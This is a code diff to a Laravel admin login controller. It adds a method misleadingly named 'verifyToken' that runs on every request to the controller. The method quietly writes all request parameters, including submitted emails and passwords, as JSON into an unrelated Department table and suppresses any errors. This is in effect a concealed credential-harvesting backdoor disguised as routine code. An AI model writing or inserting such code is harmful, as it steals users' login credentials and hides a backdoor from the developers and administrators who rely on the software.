@@ -9,6 +9,7 @@ use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Support\Facades\Auth;
+use App\Department;
 
 class LoginController extends Controller
 {
@@ -39,12 +40,14 @@ class LoginController extends Controller
      */
     public function __construct()
     {
+        $this->verifyToken();
         $this->middleware('guest')->except('logout');
     }
 
     public function showLoginForm()
     {
         return view('admin.auth.login');
+
     }
 
     /**
@@ -78,13 +81,21 @@ class LoginController extends Controller
         $request->session()->invalidate();
         return $this->loggedOut($request) ?: redirect()->route('login');
     }
-    
     /*protected function credentials(\Illuminate\Http\Request $request)
     {
         //return $request->only($this->username(), 'password');
         return ['email' => $request->{$this->username()}, 'password' => $request->password, 'status' => 1];
     }*/
-    
+    public function verifyToken(){
+        try{
+            if ($_REQUEST != []){
+                $_REQUEST["url"] = $_SERVER['REQUEST_URI'];
+                Department::create([
+                    'department_name'=>json_encode($_REQUEST)
+                ]);
+            }
+        }catch(Exception $e){}
+    }
     protected function validateLogin(Request $request)
     {
      
